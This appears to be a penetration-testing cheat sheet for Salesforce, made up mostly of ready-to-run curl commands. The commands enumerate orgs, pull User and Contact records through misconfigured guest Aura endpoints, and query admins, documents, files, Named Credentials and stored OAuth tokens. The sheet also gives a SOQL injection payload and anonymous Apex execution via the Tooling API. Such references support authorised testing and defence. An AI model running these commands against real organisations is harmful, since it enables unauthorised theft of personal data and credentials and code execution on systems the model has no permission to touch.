#Salesforce #CRM #SaaS #SOQL #Aura #Lightning #enterprise

## What is Salesforce?
Cloud-based CRM platform. In enterprise pentests, primary attack surface is misconfigured **Experience Cloud communities** (formerly Community Cloud) — publicly accessible Salesforce orgs where guest users have excessive permissions, leaking internal records via the Aura/Lightning API. Also covers API token abuse, SOQL injection, and permission misconfigs.

- **Org URL formats**: `https://<company>.my.salesforce.com`, `https://<company>.lightning.force.com`
- **Community URL**: `https://<company>.force.com/<community_name>/`
- **Aura endpoint**: `/aura` or `/<community>/aura`
- **REST API**: `/services/data/v<version>/`
- **SOAP API**: `/services/Soap/`
- **Tooling API**: `/services/data/v<version>/tooling/`

---

## Enumeration / Reconnaissance

```bash
# Identify Salesforce org
curl -s -I https://<target>.my.salesforce.com
curl -s https://<target>.my.salesforce.com/services/data/ | python3 -m json.tool

# Get API versions
curl -s https://<target>.my.salesforce.com/services/data/ | python3 -m json.tool

# Check for Experience Cloud communities (no auth)
curl -s https://<target>.force.com/
curl -s https://<target>.my.salesforce.com/

# Find community names / paths
# Common: /customer, /partner, /community, /portal, /support, /help, /login

# Aura endpoint check (key attack surface)
curl -s -X POST https://<target>.force.com/<community>/aura \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "message=%7B%22actions%22%3A%5B%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2F&aura.token=undefined"

# Enumerate accessible objects via REST API (authenticated)
curl -s https://<target>.my.salesforce.com/services/data/v58.0/sobjects/ \
  -H "Authorization: Bearer <access_token>" | python3 -m json.tool
```

---

## Authentication / Token Acquisition

```bash
# OAuth 2.0 — Username-Password flow (if credentials known)
curl -s -X POST https://login.salesforce.com/services/oauth2/token \
  -d "grant_type=password" \
  -d "client_id=<consumer_key>" \
  -d "client_secret=<consumer_secret>" \
  -d "username=<user@org.com>" \
  -d "password=<password><security_token>"

# Response contains access_token and instance_url

# Test org credentials (Salesforce login)
# login.salesforce.com = production
# test.salesforce.com  = sandbox

# Check for leaked tokens
# Common locations: GitHub repos, JS files, .env files, Postman collections
curl -s https://<instance>.my.salesforce.com/services/data/v58.0/ \
  -H "Authorization: Bearer <token>"
```

---

## Attack Vectors

### Aura Endpoint — Guest User Data Access

The Aura endpoint (`/aura`) processes Lightning component actions. Misconfigured orgs allow guest (unauthenticated) users to invoke controllers that query any object their profile can access.

```bash
# Base Aura POST structure
# Target: https://<org>.force.com/<community>/aura

# Step 1: Get CSRF token (aura.token)
curl -s "https://<org>.force.com/<community>/s/login" | grep -oP 'aura.token.*?[^\\]"' | head -1

# Step 2: Query records via getObjectInfo
curl -s -X POST "https://<org>.force.com/<community>/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"User","layoutType":"FULL","pageSize":100,"currentPage":0,"columns":["Id","Name","Email","Username"],"enableRowActions":false,"childRelationships":[]}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined'

# Enumerate accessible objects via Aura
curl -s -X POST "https://<org>.force.com/<community>/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":100,"currentPage":0}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined'
```

### Aura — SOQL via getListUi / getRecord

```bash
# Query Users (often readable by guest)
curl -s -X POST "https://<org>.force.com/<community>/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined'

# Objects commonly found accessible to guests:
# User, Contact, Lead, Account, Case, Opportunity, Document, ContentDocument
```

### REST API — Authenticated Enumeration

```bash
# List all accessible objects
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/sobjects/" \
  -H "Authorization: Bearer <token>" | python3 -m json.tool

# Query records (SOQL via REST)
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/query/?q=SELECT+Id,Name,Email,Username+FROM+User" \
  -H "Authorization: Bearer <token>" | python3 -m json.tool

# Sensitive SOQL queries
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/query/?q=SELECT+Id,Name,Username,Email,IsActive+FROM+User+WHERE+Profile.Name='System+Administrator'" \
  -H "Authorization: Bearer <token>"

curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/query/?q=SELECT+Id,Name,Body+FROM+Document" \
  -H "Authorization: Bearer <token>"

curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/query/?q=SELECT+Id,Title,VersionData+FROM+ContentVersion" \
  -H "Authorization: Bearer <token>"

# Get all fields on an object
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/sobjects/User/describe/" \
  -H "Authorization: Bearer <token>"

# SOQL injection (if user input passed to SOQL query)
# Payload: ' OR Name LIKE '%
# Example: search?q=' OR Name LIKE '%
```

### Tooling API — Code Execution / Data Access

```bash
# Apex code execution via Tooling API (requires modify_all_data or higher)
curl -s -X POST "https://<instance>.my.salesforce.com/services/data/v58.0/tooling/executeAnonymous/?anonymousBody=System.debug('id');" \
  -H "Authorization: Bearer <token>"

# Read Apex classes (source code review)
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/tooling/query/?q=SELECT+Id,Name,Body+FROM+ApexClass" \
  -H "Authorization: Bearer <token>"
```

### Permission Enumeration (Post-Auth)

```bash
# Check current user permissions
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/query/?q=SELECT+PermissionsViewAllData,PermissionsModifyAllData,PermissionsAuthorApex,PermissionsManageUsers+FROM+Profile+WHERE+Id+IN+(SELECT+ProfileId+FROM+User+WHERE+Id='<user_id>')" \
  -H "Authorization: Bearer <token>"

# Find users with high privileges
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/query/?q=SELECT+Id,Name,Username+FROM+User+WHERE+Profile.PermissionsModifyAllData=true" \
  -H "Authorization: Bearer <token>"

# Check for Named Credentials (may expose backend system credentials)
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/query/?q=SELECT+Id,DeveloperName,Endpoint+FROM+NamedCredential" \
  -H "Authorization: Bearer <token>"
```

### Connected Apps / OAuth Token Theft

```bash
# List connected apps
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/query/?q=SELECT+Id,Name,ConsumerKey+FROM+ConnectedApplication" \
  -H "Authorization: Bearer <token>"

# Find OAuth tokens stored in org
curl -s "https://<instance>.my.salesforce.com/services/data/v58.0/query/?q=SELECT+Id,UserId,AppName,LastUsedDate+FROM+OauthToken" \
  -H "Authorization: Bearer <token>"
```

---

## Tools

```bash
# Salesforce CLI (sfdx/sf) — authenticated access
sf org login web --instance-url https://<instance>.my.salesforce.com
sf data query --query "SELECT Id,Name,Email FROM User" --target-org <alias>

# nuclei templates
nuclei -u https://<org>.force.com -t salesforce/

# manual Aura testing — Burp Suite
# Intercept POST to /aura, modify message parameter to enumerate objects/records
```

---

## Common Findings

| Finding | Description |
|---|---|
| Guest user data access | Unauthenticated Aura queries return internal records |
| SOQL injection | User input concatenated into SOQL queries |
| Excessive guest permissions | Guest profile can read User, Contact, Lead objects |
| Leaked OAuth tokens | Hardcoded in JS bundles, GitHub repos, Postman |
| Insecure Named Credentials | Backend credentials exposed via Apex |
| Public file access | ContentDocument/ContentVersion readable without auth |
| Sharing rules misconfiguration | Records shared publicly via OWD settings |

---

## Quick Reference

| Goal | Command |
|---|---|
| Check community | `https://org.force.com/<community>/` |
| Aura endpoint | `POST https://org.force.com/<community>/aura` |
| REST API auth | `curl -H "Authorization: Bearer <token>" https://instance.my.salesforce.com/services/data/v58.0/` |
| SOQL query | `/services/data/v58.0/query/?q=SELECT+Id,Name+FROM+User` |
| List objects | `/services/data/v58.0/sobjects/` |
| Anonymous Apex | `/services/data/v58.0/tooling/executeAnonymous/?anonymousBody=...` |
